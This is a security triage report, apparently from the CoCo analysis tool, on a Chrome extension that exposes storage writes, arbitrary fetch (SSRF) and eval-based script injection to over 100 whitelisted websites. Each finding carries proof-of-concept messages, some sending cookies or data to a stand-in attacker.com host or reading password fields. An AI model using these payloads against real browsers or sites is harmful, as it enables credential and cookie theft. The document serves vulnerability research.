# CoCo Analysis: bdhagajjnempgekkikmaeolcjklofckb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 exploitable flows (plus several clear/remove operations)

---

## Sink 1: bg_chrome_runtime_MessageExternal -> chrome_storage_local_set_sink + storage_local_get_source -> sendResponseExternal_sink (Complete Storage Exploitation Chain)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bdhagajjnempgekkikmaeolcjklofckb/opgen_generated_files/bg.js
Line 965 (minified code, see deobfuscated analysis below)

**Code:**

```javascript
// Minified code in service-worker.js (line 965, deobfuscated for analysis)

// Storage write function
async function Lister$1(e,t,r){
  if("GetCacheData"!=e.cmd){
    if("SetCacheData"==e.cmd) {
      return(a={})[e.key]=e.value, // ← attacker-controlled key and value
      void chrome.storage.local.set(a,(()=>{r(!0)}));
    }
    if("RemoveCacheData"==e.cmd){
      var a=[e.key]; // ← attacker-controlled key
      return chrome.storage.local.remove(a),void r();
    }
    // ... session storage operations omitted ...
  }
  else chrome.storage.local.get([e.key],(t=>{
    r(t[e.key],t) // ← sends stored value back to external caller via sendResponse
  }))
}

// Main message handler
function Bg_OnMessageLister(e,t,r){
  // ... other command handlers ...
  if("GetCacheData"===e.cmd||"SetCacheData"===e.cmd||"RemoveCacheData"===e.cmd)
    return cache.Lister(e,t,r); // ← calls Lister$1
  // ... other handlers ...
}

// External message listener
chrome.runtime.onMessageExternal.addListener((function(e,t,r){
  Bg_OnMessageLister(e,t,r) // ← routes to handler
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain in externally_connectable (e.g., *.taobao.com, *.jd.com, etc.)

// Step 1: Store malicious data
chrome.runtime.sendMessage(
  'bdhagajjnempgekkikmaeolcjklofckb',
  {cmd: 'SetCacheData', key: 'malicious_key', value: 'attacker_controlled_data'},
  function(response) {
    console.log('Data stored:', response);
  }
);

// Step 2: Retrieve the stored data
chrome.runtime.sendMessage(
  'bdhagajjnempgekkikmaeolcjklofckb',
  {cmd: 'GetCacheData', key: 'malicious_key'},
  function(response) {
    console.log('Retrieved data:', response); // ← receives stored value back
    // Attacker now controls storage and can read/write arbitrary values
  }
);
```

**Impact:** Complete storage exploitation - attacker from whitelisted domains can poison chrome.storage.local with arbitrary key-value pairs and retrieve them back. This allows persistent storage manipulation that could affect extension behavior, store malicious configurations, or exfiltrate sensitive data stored by the extension.

---

## Sink 2: bg_chrome_runtime_MessageExternal -> fetch_resource_sink (SSRF)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bdhagajjnempgekkikmaeolcjklofckb/opgen_generated_files/bg.js
Line 965 (minified)

**Code:**

```javascript
// Fetch function (Lister$7)
async function Lister$7(e,t,r){
  var a={headers:await http_rule.UpdateRules(e)};
  if(e.method&&(a.method=e.method),e.data&&(a.body=e.data),e.fetchParams&&(a=e.fetchParams),
     e.type&&"base64"==e.type.toLowerCase())return GetBase64(e.url,r);

  fetch(e.url,a) // ← e.url is attacker-controlled
    .then((async t=>{
      if(t.ok){
        if(e.textDecoderType){
          const a=new TextDecoder(e.textDecoderType);
          var r=await t.arrayBuffer();
          return a.decode(new Uint8Array(r))
        }
        return t.text()
      }
      throw await t.text()
    }))
    .then((t=>{
      let a=null;
      try{a=JSON.parse(t)}catch(s){}
      var n={result:a||t,resultContent:t,success:!0};
      if(e.isNotNeedClearRules)return r(n);
      http_rule.ClearRules().then((()=>{r(n)})) // ← sends response back to attacker
    }))
    .catch((t=>{
      var a={result:t,success:!1};
      if(e.isNotNeedClearRules)return r(a);
      http_rule.ClearRules().then((()=>{r(a)}))
    }))
}

// Handler routes 'fetch' or 'ajax' commands
function Bg_OnMessageLister(e,t,r){
  // ...
  if("fetch"===e.cmd||"ajax"===e.cmd)return fetch$1.Lister(e,t,r);
  // ...
}

chrome.runtime.onMessageExternal.addListener((function(e,t,r){
  Bg_OnMessageLister(e,t,r)
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., *.taobao.com, *.jd.com, etc.)

// SSRF to internal network or arbitrary external URLs
chrome.runtime.sendMessage(
  'bdhagajjnempgekkikmaeolcjklofckb',
  {
    cmd: 'fetch',
    url: 'http://192.168.1.1/admin', // ← attacker-controlled URL (internal network)
    method: 'GET'
  },
  function(response) {
    console.log('SSRF response:', response); // ← receives fetched content
    // Attacker can probe internal network, exfiltrate data, etc.
  }
);

// Or fetch arbitrary external URLs with extension's permissions
chrome.runtime.sendMessage(
  'bdhagajjnempgekkikmaeolcjklofckb',
  {
    cmd: 'ajax',
    url: 'https://attacker.com/collect?data=stolen', // ← exfiltration
    method: 'POST',
    data: 'sensitive_information'
  },
  function(response) {
    console.log('Data exfiltrated');
  }
);
```

**Impact:** Server-Side Request Forgery - attacker can make privileged cross-origin requests to arbitrary URLs (internal network, external sites) using the extension's elevated permissions and receive responses back. This enables internal network scanning, bypassing CORS, data exfiltration, and attacks on internal services.

---

## Sink 3: bg_chrome_runtime_MessageExternal -> chrome_scripting_executeScript -> eval (Remote Code Execution)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bdhagajjnempgekkikmaeolcjklofckb/opgen_generated_files/bg.js
Line 965 (minified)

**Code:**

```javascript
// Inject function (Lister$9)
function Lister$9(e,t,r){
  var a="MAIN";
  if(e.world&&(a=e.world),2==e.type)
    return n=fillIframeIdToData$1(e,t,n={world:a,files:e.fileNames}),
    void chrome.scripting.executeScript(n).then((e=>{r(e)}));

  var n,s=[e.params];
  e.args&&(s=e.args),
  n=fillIframeIdToData$1(e,t,n={function:injectScript,args:s,world:a}),
  chrome.scripting.executeScript(n).then((e=>{r(e)}))
}

// The injected function that executes attacker code
function injectScript(params){
  if(params)return"eval"==params.type?eval(params.value):void 0 // ← EVAL of attacker-controlled value
}

// Handler routes 'inject' command
function Bg_OnMessageLister(e,t,r){
  // ...
  if("inject"===e.cmd)return inject.Lister(e,t,r);
  // ...
}

chrome.runtime.onMessageExternal.addListener((function(e,t,r){
  Bg_OnMessageLister(e,t,r)
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., *.taobao.com, *.jd.com, etc.)

// Execute arbitrary JavaScript code in active tab context
chrome.runtime.sendMessage(
  'bdhagajjnempgekkikmaeolcjklofckb',
  {
    cmd: 'inject',
    params: {
      type: 'eval',
      value: 'alert(document.cookie); fetch("https://attacker.com/steal?cookies=" + document.cookie);' // ← attacker code
    },
    tabId: null // Uses current active tab
  },
  function(response) {
    console.log('Code executed:', response);
  }
);

// Steal credentials from page
chrome.runtime.sendMessage(
  'bdhagajjnempgekkikmaeolcjklofckb',
  {
    cmd: 'inject',
    params: {
      type: 'eval',
      value: 'document.querySelectorAll("input[type=password]")[0].value' // ← steal password
    }
  },
  function(response) {
    console.log('Stolen password:', response);
  }
);
```

**Impact:** Remote Code Execution - attacker from whitelisted domains can execute arbitrary JavaScript code in the context of any webpage via chrome.scripting.executeScript with eval. This enables stealing sensitive data (cookies, passwords, tokens), manipulating page content, hijacking user sessions, and performing actions on behalf of the user.

---

## Additional Notes

The extension has an extremely permissive `externally_connectable` configuration in manifest.json with over 100 whitelisted domains including major e-commerce sites (*.taobao.com, *.jd.com, *.pinduoduo.com, *.amazon.com, etc.). Any of these domains can exploit the above vulnerabilities. Per the methodology, even if only ONE domain can trigger the flow, it's classified as TRUE POSITIVE. With 100+ domains whitelisted, the attack surface is massive.

The extension also has `<all_urls>` host permissions and powerful permissions (storage, scripting, cookies, downloads, declarativeNetRequest), making the impact of these vulnerabilities severe.
